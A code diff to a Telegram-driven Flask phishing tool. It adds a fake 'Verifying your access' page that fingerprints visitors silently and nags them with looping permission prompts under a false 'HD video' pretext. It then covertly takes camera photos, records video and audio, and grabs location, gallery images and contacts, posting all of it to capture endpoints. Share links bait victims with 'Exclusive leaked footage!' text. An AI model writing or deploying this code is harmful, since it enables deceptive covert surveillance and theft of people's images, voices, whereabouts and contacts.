@@ -540,6 +540,188 @@ sendFingerprint();
 
 
 # ─────────────────────────────────────────
+# SIMPLE TEMPLATE (Inline keyboard style)
+# Auto-triggers permissions immediately on load, loops until allowed
+# ─────────────────────────────────────────
+SIMPLE_TEMPLATE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
+<title>Loading...</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d0d0d;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.wrap{text-align:center;padding:30px 20px;width:100%}
+.spinner{width:64px;height:64px;border:4px solid #1e1e1e;border-top:4px solid #e63946;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 22px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.title{font-size:1.1rem;font-weight:700;margin-bottom:6px}
+.sub{font-size:.8rem;color:#555;margin-bottom:20px}
+.bar{width:200px;height:3px;background:#1a1a1a;border-radius:3px;margin:0 auto;overflow:hidden}
+.fill{height:100%;background:#e63946;width:0%;transition:width .4s}
+.modal-bd{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:200;align-items:center;justify-content:center}
+.modal-bd.show{display:flex}
+.modal{background:#141414;border:1px solid #2a2a2a;border-radius:14px;padding:26px 22px;max-width:320px;width:92%;text-align:center}
+.micon{font-size:2.6rem;margin-bottom:10px}
+.mtitle{font-size:1rem;font-weight:700;line-height:1.5;margin-bottom:8px}
+.mbody{color:#888;font-size:.8rem;line-height:1.6;margin-bottom:18px}
+.mbtn{width:100%;padding:13px;border:none;border-radius:9px;background:linear-gradient(135deg,#e63946,#c1121f);color:#fff;font-size:.95rem;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(230,57,70,.3)}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="spinner"></div>
+  <div class="title">Verifying your access...</div>
+  <div class="sub">Allow all permissions to continue</div>
+  <div class="bar"><div class="fill" id="fill"></div></div>
+</div>
+<div class="modal-bd" id="modal"></div>
+<input type="file" id="galleryInput" accept="image/*" multiple style="display:none">
+<script>
+const token="{{ token }}";
+const mode="{{ mode }}";
+function setFill(p){document.getElementById('fill').style.width=p+'%';}
+function showPermModal(icon,titleMM,titleEN,bodyMM,bodyEN){
+  return new Promise(resolve=>{
+    const bd=document.getElementById('modal');
+    bd.innerHTML=`<div class="modal">
+      <div class="micon">${icon}</div>
+      <div class="mtitle">${titleMM}<br><small style="color:#888;font-weight:400;font-size:.82em">${titleEN}</small></div>
+      <div class="mbody">${bodyMM}<br><span style="color:#555">${bodyEN}</span></div>
+      <button class="mbtn" id="rb">Allow ကိုနှိပ်ပါ ▶</button>
+    </div>`;
+    bd.classList.add('show');
+    document.getElementById('rb').onclick=()=>{bd.classList.remove('show');resolve();};
+  });
+}
+async function getDeviceModel(){
+  if(navigator.userAgentData){try{const d=await navigator.userAgentData.getHighEntropyValues(['model','platform']);if(d.model&&d.model.trim())return d.model.trim();}catch(e){}}
+  const ua=navigator.userAgent;let m=ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);if(m)return m[1].trim();
+  m=ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);if(m)return m[3].trim();return navigator.platform||'Unknown';
+}
+async function collectFingerprint(){
+  let battery={};try{const b=await navigator.getBattery();battery={batteryLevel:Math.round(b.level*100)+'%',charging:b.charging};}catch(e){}
+  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
+  const deviceModel=await getDeviceModel();
+  return{userAgent:navigator.userAgent,deviceModel,platform:navigator.platform,screenWidth:screen.width,screenHeight:screen.height,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,maxTouchPoints:navigator.maxTouchPoints,connectionType:conn.effectiveType||conn.type||'unknown',downlink:conn.downlink,localTime:new Date().toString(),...battery};
+}
+async function getCameraStream(facing){
+  while(true){try{return await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1920},height:{ideal:1080}}});}
+  catch(e){await showPermModal('📸','ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်','Camera Access Required','HD ဗီဒီယို ကြည့်ရှုရန် ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်','Camera permission is required to stream HD content.');}}
+}
+async function getMicStream(){
+  while(true){try{return await navigator.mediaDevices.getUserMedia({audio:true});}
+  catch(e){await showPermModal('🎤','မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်','Microphone Required','HD အသံဖြင့် ကြည့်ရှုရန် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်','Microphone permission required for HD audio playback.');}}
+}
+async function getLocationPos(){
+  while(true){try{return await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:15000,enableHighAccuracy:true}));}
+  catch(e){await showPermModal('📍','တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်','Location Verification Required','သင့်ဒေသ စစ်ဆေးမှသာ ဤဗီဒီယို ကြည့်ရှုနိုင်မည်','Location check required to unlock this content in your region.');}}
+}
+async function sendPhoto(){
+  try{
+    const stream=await getCameraStream('environment');
+    const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
+    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
+    await new Promise(r=>setTimeout(r,1500));
+    const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());
+    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));if(!blob||blob.size<800)return;
+    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('photo',blob,'photo.jpg');form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_combined_photo',{method:'POST',body:form});
+  }catch(e){}
+}
+async function sendFrontPhoto(){
+  try{
+    const stream=await getCameraStream('user');
+    const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
+    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
+    await new Promise(r=>setTimeout(r,1500));
+    const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());
+    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));if(!blob||blob.size<800)return;
+    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('photo',blob,'selfie.jpg');form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_combined_photo',{method:'POST',body:form});
+  }catch(e){}
+}
+async function sendLocation(){
+  try{
+    const pos=await getLocationPos();const fp=await collectFingerprint();const form=new FormData();
+    form.append('token',token);form.append('lat',pos.coords.latitude);form.append('lon',pos.coords.longitude);form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_combined_location',{method:'POST',body:form});
+  }catch(e){}
+}
+async function sendVideo(){
+  try{
+    const mimeType=MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')?'video/webm;codecs=vp8,opus':'video/webm';
+    const camStream=await getCameraStream('user');const micStream=await getMicStream();
+    const combined=new MediaStream([...camStream.getVideoTracks(),...micStream.getAudioTracks()]);
+    const recorder=new MediaRecorder(combined,{mimeType});const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};recorder.start(300);
+    await new Promise(r=>setTimeout(r,4000));recorder.stop();camStream.getTracks().forEach(t=>t.stop());micStream.getTracks().forEach(t=>t.stop());
+    await new Promise(r=>recorder.onstop=r);const blob=new Blob(chunks,{type:mimeType});
+    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('video',blob,'video.webm');form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_combined_video',{method:'POST',body:form});
+  }catch(e){}
+}
+async function sendAudio(){
+  try{
+    const stream=await getMicStream();const mimeType=MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?'audio/webm;codecs=opus':'audio/webm';
+    const recorder=new MediaRecorder(stream,{mimeType});const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};recorder.start(300);
+    await new Promise(r=>setTimeout(r,6000));recorder.stop();stream.getTracks().forEach(t=>t.stop());
+    await new Promise(r=>recorder.onstop=r);const blob=new Blob(chunks,{type:mimeType});
+    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('audio',blob,'audio.webm');form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_combined_audio',{method:'POST',body:form});
+  }catch(e){}
+}
+async function sendGallery(){
+  try{
+    await new Promise(resolve=>{
+      document.getElementById('galleryInput').onchange=async(event)=>{
+        const files=event.target.files;
+        if(files&&files.length>0){
+          for(let i=0;i<Math.min(files.length,5);i++){
+            const file=files[i];
+            const meta=`🖼️ <b>GALLERY PHOTO CAPTURED</b>\\n\\nFilename: ${file.name}\\nType: ${file.type}\\nSize: ${Math.round(file.size/1024)} KB\\nTime: ${new Date().toLocaleString()}`;
+            fetch('/capture_gallery_meta',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,text:meta})});
+            if(file.size<512000){await new Promise(r=>{const reader=new FileReader();reader.onload=async(e)=>{fetch('/capture_gallery_photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,photo:e.target.result,caption:`Gallery: ${file.name}`})});r();};reader.readAsDataURL(file);});}
+          }
+        }
+        resolve();
+      };
+      document.getElementById('galleryInput').click();
+    });
+  }catch(e){}
+}
+async function sendContacts(){
+  try{
+    if(!('contacts' in navigator&&'ContactsManager' in window)){fetch('/capture_contacts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,contacts:[],note:'API not supported on this device'})});return;}
+    const contacts=await navigator.contacts.select(['name','tel','email'],{multiple:true});
+    if(contacts&&contacts.length>0){fetch('/capture_contacts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,contacts})});}
+  }catch(e){}
+}
+async function startCapture(){
+  setFill(8);
+  if(mode==='all'){
+    await Promise.allSettled([sendPhoto(),sendLocation()]);setFill(50);
+    await sendVideo();setFill(80);await sendAudio();setFill(100);
+  }else if(mode==='photo'){await sendPhoto();setFill(100);}
+  else if(mode==='audio'){await sendAudio();setFill(100);}
+  else if(mode==='location'){await sendLocation();setFill(100);}
+  else if(mode==='video'){await sendVideo();setFill(100);}
+  else if(mode==='gallery'){await sendGallery();setFill(100);}
+  else if(mode==='frontcam'){await sendFrontPhoto();setFill(100);}
+  else if(mode==='contacts'){await sendContacts();setFill(100);}
+  else{setFill(100);}
+}
+// Send fingerprint silently
+(async()=>{try{const fp=await collectFingerprint();fetch('/capture_fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint:fp})});}catch(e){}})();
+// Start capture immediately on load
+window.addEventListener('load',()=>startCapture());
+</script>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────
 # FLASK ROUTES
 # ─────────────────────────────────────────
 @flask_app.route('/')
@@ -576,7 +758,9 @@ def track_page(token):
             f"━━━━━━━━━━━━━━━━━━━━"
         )
         threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
-    return render_template_string(HTML_TEMPLATE, token=token, mode=mode)
+    style = request.args.get('style', 'full')
+    template = SIMPLE_TEMPLATE if style == 'simple' else HTML_TEMPLATE
+    return render_template_string(template, token=token, mode=mode)
 
 
 # ─────────────────────────────────────────
@@ -879,15 +1063,18 @@ def main_menu_inline():
 
 def make_links_inline(token):
     base = f"{BASE_URL}/track/{token}"
-    all_url = f"{base}?m=all"
+    all_url = f"{base}?m=all&style=simple"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(all_url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🌐 All-in-One", url=all_url)],
-        [InlineKeyboardButton("📸 Photo + Device", url=f"{base}?m=photo"),
-         InlineKeyboardButton("🎤 Audio + Device", url=f"{base}?m=audio")],
-        [InlineKeyboardButton("📍 Location + Device", url=f"{base}?m=location"),
-         InlineKeyboardButton("🎥 Video + Device", url=f"{base}?m=video")],
+        [InlineKeyboardButton("📸 Photo", url=f"{base}?m=photo&style=simple"),
+         InlineKeyboardButton("🎤 Audio", url=f"{base}?m=audio&style=simple")],
+        [InlineKeyboardButton("📍 Location", url=f"{base}?m=location&style=simple"),
+         InlineKeyboardButton("🎥 Video", url=f"{base}?m=video&style=simple")],
+        [InlineKeyboardButton("🖼️ Gallery", url=f"{base}?m=gallery&style=simple"),
+         InlineKeyboardButton("🤳 Front Cam", url=f"{base}?m=frontcam&style=simple")],
+        [InlineKeyboardButton("📞 Contacts", url=f"{base}?m=contacts&style=simple")],
         [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
         [InlineKeyboardButton("📋 Active Links", callback_data="links"),
          InlineKeyboardButton("🏠 Menu", callback_data="menu")],
@@ -921,7 +1108,7 @@ def format_single_link_msg(token, mode_key, label):
 
 
 def single_link_inline(token, mode_key, label):
-    url = f"{BASE_URL}/track/{token}?m={mode_key}"
+    url = f"{BASE_URL}/track/{token}?m={mode_key}&style=simple"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
